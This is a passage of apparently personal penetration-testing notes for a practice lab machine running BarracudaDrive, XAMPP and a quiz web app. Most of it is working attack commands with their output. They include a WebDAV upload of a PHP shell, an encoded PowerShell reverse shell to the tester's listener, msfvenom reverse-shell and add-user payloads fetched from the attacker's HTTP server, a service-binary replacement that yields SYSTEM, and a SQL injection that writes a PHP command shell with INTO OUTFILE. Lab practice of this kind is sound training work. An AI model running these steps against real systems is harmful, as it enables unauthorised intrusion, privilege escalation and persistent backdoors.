|_    Host '192.168.49.65' is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host '192.168.49.65' is not allowed to connect to this MariaDB server
```

## 8000/tcp open  http-alt   BarracudaServer.com (Windows)

![](Pasted%20image%2020220127204644.png)

Follow the configuration wizard, put in a dummy email, `administrator`:`administrator`, and you will be logged in

![](Pasted%20image%2020220127212607.png)

![](Pasted%20image%2020220127204930.png)

![](Pasted%20image%2020220127205044.png)

### Potential Exploits

Privilege Escalation
* https://www.exploit-db.com/exploits/48789
* https://github.com/boku7/BarracudaDrivev6.5-LocalPrivEsc

### WebDAV

#### Files Leak
```
┌──(kali㉿kali)-[/media/…/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices]
└─$ cadaver http://192.168.157.127:8000/fs/                                                                                                                       255 ⨯
Authentication required for Web File Server on server `192.168.157.127':
Username: administrator
Password: 
dav:/fs/> ls
Listing collection `/fs/': succeeded.
Coll:   C                                      0  Dec 31  1969
Coll:   D                                      0  Dec 31  1969
dav:/fs/> cd C
dav:/fs/C/> ls
Listing collection `/fs/C/': succeeded.
Coll:   $Recycle.Bin                           0  Nov  3  2020
Coll:   $WinREAgent                            0  Dec  2 13:17
Coll:   Documents and Settings                 0  Oct 16  2020
Coll:   FTP                                    0  Nov  3  2020
Coll:   PerfLogs                               0  Dec  7  2019
Coll:   Program Files (x86)                    0  Dec  2 15:35
Coll:   Program Files                          0  Dec  2 13:08
Coll:   ProgramData                            0  Dec  7 11:17
Coll:   RailsInstaller                         0  Nov  3  2020
Coll:   Recovery                               0  Dec  2 12:36
Coll:   Ruby26-x64                             0  Nov  3  2020
Coll:   Sites                                  0  Nov  3  2020
Coll:   System Volume Information              0  Oct 16  2020
Coll:   Users                                  0  Dec  2 12:37
Coll:   Windows                                0  Dec  2 13:37
Coll:   bd                                     0  Jan 27 07:48
Coll:   xampp                                  0  Oct 16  2020
        DumpStack.log.tmp                   8192  Dec  8 08:19
        pagefile.sys                  1476395008  Dec  8 08:19
        swapfile.sys                   268435456  Dec  8 08:19
dav:/fs/C/> cd FTP
dav:/fs/C/FTP/> ls
Listing collection `/fs/C/FTP/': succeeded.
Coll:   app                                    0  Nov  3  2020
Coll:   bin                                    0  Nov  3  2020
Coll:   config                                 0  Nov  3  2020
Coll:   db                                     0  Nov  3  2020
Coll:   lib                                    0  Nov  3  2020
Coll:   log                                    0  Nov  3  2020
Coll:   public                                 0  Nov  3  2020
Coll:   test                                   0  Nov  3  2020
Coll:   tmp                                    0  Nov  3  2020
Coll:   vendor                                 0  Nov  3  2020
        .gitignore                           536  Nov  3  2020
        Gemfile                             1750  Nov  3  2020
        README.md                            374  Nov  3  2020
        Rakefile                             227  Nov  3  2020
        config.ru                            130  Nov  3  2020
        package.json                          66  Nov  3  2020
dav:/fs/C/FTP/> cd ..
dav:/fs/C/> cd Users
dav:/fs/C/Users/> ls
Listing collection `/fs/C/Users/': succeeded.
Coll:   Administrator                          0  Dec  2 12:51
Coll:   All Users                              0  Dec  7  2019
Coll:   Default User                           0  Dec  7  2019
Coll:   Default                                0  Dec  2 12:45
Coll:   Jerren                                 0  Dec  2 12:46
Coll:   Public                                 0  Dec  2 15:33
        desktop.ini                          174  Dec  7  2019
dav:/fs/C/Users/> cd Jerren
dav:/fs/C/Users/Jerren/> ls
Listing collection `/fs/C/Users/Jerren/': succeeded.
Coll:   .bundle                                0  Nov  3  2020
Coll:   .gem                                   0  Nov  3  2020
Coll:   3D Objects                             0  Dec  2 12:46
Coll:   AppData                                0  Dec  2 12:38
Coll:   Application Data                       0  Dec  2 12:38
Coll:   Contacts                               0  Dec  2 12:46
Coll:   Cookies                                0  Dec  2 12:38
Coll:   Desktop                                0  Dec  2 12:46
Coll:   Documents                              0  Dec  2 12:46
Coll:   Downloads                              0  Dec  2 12:46
Coll:   Favorites                              0  Dec  2 12:46
Coll:   Links                                  0  Dec  2 12:46
Coll:   Local Settings                         0  Dec  2 12:38
Coll:   MicrosoftEdgeBackups                   0  Nov  3  2020
Coll:   Music                                  0  Dec  2 12:46
Coll:   My Documents                           0  Dec  2 12:38
Coll:   NetHood                                0  Dec  2 12:38
Coll:   OneDrive                               0  Nov  3  2020
Coll:   Pictures                               0  Dec  2 12:46
Coll:   PrintHood                              0  Dec  2 12:38
Coll:   Recent                                 0  Dec  2 12:38
Coll:   Saved Games                            0  Dec  2 12:46
Coll:   Searches                               0  Dec  2 12:46
Coll:   SendTo                                 0  Dec  2 12:38
Coll:   Start Menu                             0  Dec  2 12:38
Coll:   Templates                              0  Dec  2 12:38
Coll:   Videos                                 0  Dec  2 12:46
        .yarnrc                              121  Nov  3  2020
        NTUSER.DAT                       1310720  Dec  7 11:16
        NTUSER.DAT{4eddc8bd-5396-11ec-a008-0050568a17d7}.TM.blf      65536  Dec  2 12:38
        NTUSER.DAT{4eddc8bd-5396-11ec-a008-0050568a17d7}.TMContainer00000000000000000001.regtrans-ms     524288  Dec  2 12:38
        NTUSER.DAT{4eddc8bd-5396-11ec-a008-0050568a17d7}.TMContainer00000000000000000002.regtrans-ms     524288  Dec  2 12:38
        ntuser.dat.LOG1                   598016  Dec  2 12:38
        ntuser.dat.LOG2                   114688  Dec  2 12:38
        ntuser.ini                            20  Dec  2 12:46
dav:/fs/C/Users/Jerren/> cd Desktop
dav:/fs/C/Users/Jerren/Desktop/> ls
Listing collection `/fs/C/Users/Jerren/Desktop/': succeeded.
        Microsoft Edge.lnk                  2348  Dec  2 12:46
        desktop.ini                          282  Dec  2 12:46
        local.txt                             34  Jan 27 07:44
dav:/fs/C/Users/Jerren/Desktop/> help
Available commands: 
 ls         cd         pwd        put        get        mget       mput       
 edit       less       mkcol      cat        delete     rmcol      copy       
 move       lock       unlock     discover   steal      showlocks  version    
 checkin    checkout   uncheckout history    label      propnames  chexec     
 propget    propdel    propset    search     set        open       close      
 echo       quit       unset      lcd        lls        lpwd       logout     
 help       describe   about      
Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye
dav:/fs/C/Users/Jerren/Desktop/> get local.txt
Downloading `/fs/C/Users/Jerren/Desktop/local.txt' to local.txt:
Progress: [=============================>] 100.0% of 34 bytes succeeded.
dav:/fs/C/Users/Jerren/Desktop/> cd ../../Administrator
dav:/fs/C/Users/Administrator/> cd Desktop
dav:/fs/C/Users/Administrator/Desktop/> get proof.txt
Downloading `/fs/C/Users/Administrator/Desktop/proof.txt' to proof.txt:
Progress: [=============================>] 100.0% of 34 bytes succeeded.
dav:/fs/C/Users/Administrator/Desktop/> exit
Connection to `192.168.157.127' closed.
                                                                                                                                                                                                                                                                                                                                                
┌──(kali㉿kali)-[/media/…/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices]
└─$ cat local.txt                           
6aad39e29d18231838cc143b86fc2f52
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices]
└─$ cat proof.txt 
c3e2ba85d4f3e2d389b5eacae9457788
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices]
└─$ 

```

#### Web Server enum
```
┌──(kali㉿kali)-[/tmp]
└─$ cadaver http://192.168.157.127:8000/fs/
Authentication required for Web File Server on server `192.168.157.127':
Username: administrator
Password: 
dav:/fs/> ls
Listing collection `/fs/': succeeded.
Coll:   C                                      0  Dec 31  1969
Coll:   D                                      0  Dec 31  1969
dav:/fs/> cd C/
dav:/fs/C/> ls
Listing collection `/fs/C/': succeeded.
Coll:   $Recycle.Bin                           0  Nov  3  2020
Coll:   $WinREAgent                            0  Dec  2 13:17
Coll:   Documents and Settings                 0  Oct 16  2020
Coll:   FTP                                    0  Nov  3  2020
Coll:   PerfLogs                               0  Dec  7  2019
Coll:   Program Files (x86)                    0  Dec  2 15:35
Coll:   Program Files                          0  Dec  2 13:08
Coll:   ProgramData                            0  Dec  7 11:17
Coll:   RailsInstaller                         0  Nov  3  2020
Coll:   Recovery                               0  Dec  2 12:36
Coll:   Ruby26-x64                             0  Nov  3  2020
Coll:   Sites                                  0  Nov  3  2020
Coll:   System Volume Information              0  Oct 16  2020
Coll:   Users                                  0  Dec  2 12:37
Coll:   Windows                                0  Dec  2 13:37
Coll:   bd                                     0  Jan 27 07:48
Coll:   xampp                                  0  Oct 16  2020
        DumpStack.log.tmp                   8192  Dec  8 08:19
        pagefile.sys                  1476395008  Dec  8 08:19
        swapfile.sys                   268435456  Dec  8 08:19
dav:/fs/C/> cd xampp
dav:/fs/C/xampp/> ls
Listing collection `/fs/C/xampp/': succeeded.
Coll:   FileZillaFTP                           0  Oct 16  2020
Coll:   MercuryMail                            0  Oct 16  2020
Coll:   anonymous                              0  Oct 16  2020
Coll:   apache                                 0  Oct 16  2020
Coll:   cgi-bin                                0  Oct 16  2020
Coll:   contrib                                0  Oct 16  2020
Coll:   htdocs                                 0  Nov  3  2020
Coll:   img                                    0  Oct 16  2020
Coll:   install                                0  Oct 16  2020
Coll:   licenses                               0  Oct 16  2020
Coll:   locale                                 0  Oct 16  2020
Coll:   mailoutput                             0  Oct 16  2020
Coll:   mailtodisk                             0  Oct 16  2020
Coll:   mysql                                  0  Oct 16  2020
Coll:   php                                    0  Oct 16  2020
Coll:   sendmail                               0  Oct 16  2020
Coll:   src                                    0  Oct 16  2020
Coll:   tmp                                    0  Jan 27 07:58
Coll:   webdav                                 0  Oct 16  2020
        apache_start.bat                     436  Jun  7  2013
        apache_stop.bat                      176  Oct 16  2020
        catalina_service.bat                9439  Mar 30  2013
        catalina_start.bat                  4478  Oct 22  2019
        catalina_stop.bat                   4180  Oct 22  2019
        ctlscript.bat                       2731  Oct 16  2020
        filezilla_setup.bat                   78  Mar 30  2013
        filezilla_start.bat                  150  Jun  7  2013
        filezilla_stop.bat                   149  Jun  7  2013
        killprocess.bat                      299  Aug 27  2019
        mercury_start.bat                    136  Jun  7  2013
        mercury_stop.bat                      60  Jun  7  2013
        mysql_start.bat                      471  Jun  3  2019
        mysql_stop.bat                       256  Oct 16  2020
        passwords.txt                        824  Mar 13  2017
        properties.ini                       792  Oct 16  2020
        readme_de.txt                       7499  Oct 14  2020
        readme_en.txt                       7369  Oct 14  2020
        service.exe                        60928  Mar 30  2013
        setup_xampp.bat                     1255  Mar 30  2013
        test_php.bat                        2052  Dec  8  2016
        uninstall.dat                     142169  Oct 16  2020
        uninstall.exe                   12499064  Oct 16  2020
        xampp-control.exe                3368448  Jun  5  2019
        xampp-control.ini                   1201  Dec  2 11:43
        xampp-control.log                  37721  Dec  7 11:16
        xampp_shell.bat                     1084  Oct 16  2020
        xampp_start.exe                   118784  Mar 30  2013
        xampp_stop.exe                    118784  Mar 30  2013
dav:/fs/C/xampp/> cd htdocs
dav:/fs/C/xampp/htdocs/> ls
Listing collection `/fs/C/xampp/htdocs/': succeeded.
        index.html                           887  Nov  3  2020
        phpinfo.php                           21  Nov  3  2020
        script.js                           3023  Nov  3  2020
        styles.css                          1266  Nov  3  2020
dav:/fs/C/xampp/htdocs/> get index.html
Downloading `/fs/C/xampp/htdocs/index.html' to index.html:
Progress: [=============================>] 100.0% of 887 bytes succeeded.
dav:/fs/C/xampp/htdocs/> exit
Connection to `192.168.157.127' closed.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat index.html                                                                                                 
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link href="styles.css" rel="stylesheet">
  <script defer src="script.js"></script>
  <title>Quiz App</title>
</head>
<body>
  <div class="container">
    <div id="question-container" class="hide">
      <div id="question">Question</div>
      <div id="answer-buttons" class="btn-grid">
        <button class="btn">Answer 1</button>
        <button class="btn">Answer 2</button>
        <button class="btn">Answer 3</button>
        <button class="btn">Answer 4</button>
      </div>
    </div>
    <div class="controls">
      <button id="start-btn" class="start-btn btn">Start</button>
      <button id="next-btn" class="next-btn btn hide">Next</button>
    </div>
  </div>
</body>
</html>                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```


## 33033 - HTTP Custom Application

![](Pasted%20image%2020220127205850.png)

## 45332 - Quiz Application
![](Pasted%20image%2020220127210518.png)

![](Pasted%20image%2020220127210543.png)

# 45433 - Same as 45332

![](Pasted%20image%2020220127210612.png)

![](Pasted%20image%2020220127210625.png)

# Exploitation

Create administrator account on the BarracudaServer 
Use that account to access the WebDAV files
Get txt files
Upload PHP payload

```
┌──(kali㉿kali)-[/tmp]
└─$ cadaver http://192.168.157.127:8000/fs/                                 
Authentication required for Web File Server on server `192.168.157.127':
Username: administrator
Password: 
dav:/fs/> cd C/xampp/htdocs
dav:/fs/C/xampp/htdocs/> put shell.php
Uploading shell.php to `/fs/C/xampp/htdocs/shell.php':
Progress: [=============================>] 100.0% of 3011 bytes succeeded.
dav:/fs/C/xampp/htdocs/> exit
Connection to `192.168.157.127' closed.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo echo 1      
[sudo] password for kali: 
1
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl http://192.168.157.127:45443/shell.php & sudo nc -nlvp 443
[1] 2552
listening on [any] 443 ...
connect to [192.168.49.157] from (UNKNOWN) [192.168.157.127] 49799

whoami
medjed\jerren
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEANQA3ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=

```

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [192.168.49.157] from (UNKNOWN) [192.168.157.127] 49804

PS C:\xampp\htdocs> cd \Users\jerren
PS C:\Users\jerren> cd Desktop
PS C:\Users\jerren\Desktop> type local.txt
6aad39e29d18231838cc143b86fc2f52
PS C:\Users\jerren\Desktop> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.157.127
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.157.254
PS C:\Users\jerren\Desktop> 


```

![](Pasted%20image%2020220127211322.png)
# Privesc

### Try creating a user
https://www.exploit-db.com/exploits/48789

```
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.157 LPORT=443  EXITFUNC=thread -f exe > meterpreter.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/adduser USER=attacker PASS=P@ssw0rd1234 -f exe > adduser.exe                              
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 278 bytes
Final size of exe file: 73802 bytes
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 80                                                                                    
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.157.127 - - [27/Jan/2022 08:19:43] "GET /adduser.exe HTTP/1.1" 200 -
192.168.157.127 - - [27/Jan/2022 08:27:36] "GET /meterpreter.exe HTTP/1.1" 200 -
192.168.157.127 - - [27/Jan/2022 08:29:48] "GET /adduser.exe HTTP/1.1" 200 -


```

Regain Shell - Have to reboot box once initial shell dies

```
┌──(kali㉿kali)-[/tmp]
└─$ curl http://192.168.157.127:45443/shell.php & sudo nc -nlvp 443
[1] 2784
listening on [any] 443 ...
connect to [192.168.49.157] from (UNKNOWN) [192.168.157.127] 49690
dir
 Volume in drive C has no label.
 Volume Serial Number is A41E-B108

 Directory of C:\xampp\htdocs

01/27/2022  08:26 AM    <DIR>          .
01/27/2022  08:26 AM    <DIR>          ..
11/03/2020  02:13 PM               887 index.html
11/03/2020  02:16 PM                21 phpinfo.php
11/03/2020  02:13 PM             3,023 script.js
01/27/2022  08:26 AM             3,011 shell.php
11/03/2020  02:14 PM             1,266 styles.css
               5 File(s)          8,208 bytes
               2 Dir(s)  10,569,940,992 bytes free
wget 192.168.49.157/meterpreter.exe -O meterpreter.exe
'wget' is not recognized as an internal or external command,
operable program or batch file.
powershell -c wget 192.168.49.157/meterpreter.exe -O meterpreter.exe
meterpreter.exe

```

```          
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 443 
[sudo] password for kali: 
listening on [any] 443 ...
connect to [192.168.49.157] from (UNKNOWN) [192.168.157.127] 49699
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs>cacls C:\bd
cacls C:\bd
C:\bd BUILTIN\Administrators:(OI)(CI)(ID)F 
      NT AUTHORITY\SYSTEM:(OI)(CI)(ID)F 
      BUILTIN\Users:(OI)(CI)(ID)R 
      NT AUTHORITY\Authenticated Users:(ID)C 
      NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(ID)C 


C:\xampp\htdocs>cacls C:\bd\bd.exe
cacls C:\bd\bd.exe
C:\bd\bd.exe BUILTIN\Administrators:(ID)F 
             NT AUTHORITY\SYSTEM:(ID)F 
             BUILTIN\Users:(ID)R 
             NT AUTHORITY\Authenticated Users:(ID)C 


C:\xampp\htdocs>sc qc bd
sc qc bd
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: bd
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\bd\bd.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : BarracudaDrive ( bd ) service
        DEPENDENCIES       : Tcpip
        SERVICE_START_NAME : LocalSystem

C:\xampp\htdocs>cd \bd
cd \bd

C:\bd>move bd.exe bd.service.exe
move bd.exe bd.service.exe
        1 file(s) moved.

C:\bd>wget 192.168.49.157/adduser.exe -O bd.exe
wget 192.168.49.157/adduser.exe -O bd.exe
'wget' is not recognized as an internal or external command,
operable program or batch file.

C:\bd>powershell -c wget 192.168.49.157/adduser.exe -O bd.exe
powershell -c wget 192.168.49.157/adduser.exe -O bd.exe

C:\bd>net user attacker
net user attacker
The user name could not be found.

More help is available by typing NET HELPMSG 2221.


C:\bd>

C:\bd>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\bd>shutdown /r
shutdown /r

C:\bd>whoami
whoami
medjed\jerren

C:\bd>                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ 

┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 192.168.157.127 -u attacker -p P@ssw0rd1234
SMB         192.168.157.127 445    MEDJED           [*] Windows 10.0 Build 19041 x64 (name:MEDJED) (domain:medjed) (signing:False) (SMBv1:False)
SMB         192.168.157.127 445    MEDJED           [+] medjed\attacker:P@ssw0rd1234 
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ smbmap -H 192.168.157.127 -u attacker -p P@ssw0rd1234                                                                                                           2 ⨯
[+] IP: 192.168.157.127:445     Name: 192.168.157.127                                   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 

┌──(kali㉿kali)-[~]
└─$ atexec.py attacker@192.168.157.127 whoami                                                                                                                       1 ⨯
Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation

[!] This will work ONLY on Windows >= Vista
Password:
[*] Creating task \kzrpOuKv
[-] rpc_s_access_denied
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$
```

### Direct reverse shell

```
┌──(kali㉿kali)-[/tmp]
└─$ curl http://192.168.157.127:45443/shell.php & sudo nc -nlvp 443
[1] 2928
listening on [any] 443 ...
connect to [192.168.49.157] from (UNKNOWN) [192.168.157.127] 49740
whoami
medjed\jerren
cd \bd
del bd.exe
powershell -c wget 192.168.157.127/meterpreter.exe -O bd.exe
wget : Unable to connect to the remote server
At line:1 char:1
+ wget 192.168.157.127/meterpreter.exe -O bd.exe
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc 
   eption
    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
 
powershell -c wget 192.168.49.157/meterpreter.exe -O bd.exe 

whoami
medjed\jerren
shutdown /r
curl: (56) Recv failure: Connection reset by peer
                                                                                                                                                                        
[1]  + exit 56    curl http://192.168.157.127:45443/shell.php
┌──(kali㉿kali)-[/tmp]
└─$ 

```

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.49.157] from (UNKNOWN) [192.168.157.127] 49669
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system

C:\WINDOWS\system32>hostanme
hostanme
'hostanme' is not recognized as an internal or external command,
operable program or batch file.

C:\WINDOWS\system32>cd \Users\Administrator
cd \Users\Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>hostname
hostname
medjed

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
5f3f0dcb1d3aaaa93376da0559c4e9f0

C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.157.127
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.157.254

C:\Users\Administrator\Desktop>type ../../Jerren/Desktop/local.txt
type ../../Jerren/Desktop/local.txt
The syntax of the command is incorrect.

C:\Users\Administrator\Desktop>cd ../../jerren/Desktop
cd ../../jerren/Desktop

C:\Users\Jerren\Desktop>type local.txt
type local.txt
f0a999583be12e47cb2126c8fe1026f5

C:\Users\Jerren\Desktop>


```

![](Pasted%20image%2020220127214049.png)

# Others

SQL Injection Exploitation

## File Enum with 30021

```
┌──(kali㉿kali)-[/tmp]
└─$ wget -r ftp://192.168.157.127:30021 --user=anonymous               
--2022-01-27 08:51:48--  ftp://192.168.157.127:30021/
           => ‘192.168.157.127:30021/.listing’
Connecting to 192.168.157.127:30021... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... done.    ==> LIST ... done.

```

## Burp Brute force SQLi

![](Pasted%20image%2020220127221836.png)

![](Pasted%20image%2020220127221820.png)


## Login

![](Pasted%20image%2020220127223748.png)

![](Pasted%20image%2020220127223647.png)


If you don't put the reminder correctly, they will give you this
![](Pasted%20image%2020220127223716.png)

Else password is changed


![](Pasted%20image%2020220127223906.png)

![](Pasted%20image%2020220127223923.png)

![](Pasted%20image%2020220127223957.png)

![](Pasted%20image%2020220127224009.png)

`jerren.devops' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:\\xampp\\htdocs\\test.php'; -- -`

![](Pasted%20image%2020220127224716.png)

![](Pasted%20image%2020220127224659.png)


![](Pasted%20image%2020220127224753.png)

You could also gobuster and brute force to this /slug